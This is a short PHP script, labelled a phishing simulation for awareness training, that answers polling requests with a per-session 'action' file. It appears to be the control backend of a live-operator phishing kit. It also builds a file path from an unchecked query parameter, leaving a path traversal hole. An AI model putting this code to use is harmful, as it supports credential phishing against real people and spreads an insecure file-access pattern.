<?php
// ⚠️ This is a phishing simulation for educational awareness only.
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
if (empty($sessionId) || empty($clientIp)) {
    echo json_encode(['error' => 'Missing params']);
    exit;
}
$actionFile = "sessions/{$sessionId}_action.json";
$response = ['action' => null];
if (file_exists($actionFile)) {
    $response = json_decode(file_get_contents($actionFile), true);
}
echo json_encode($response);
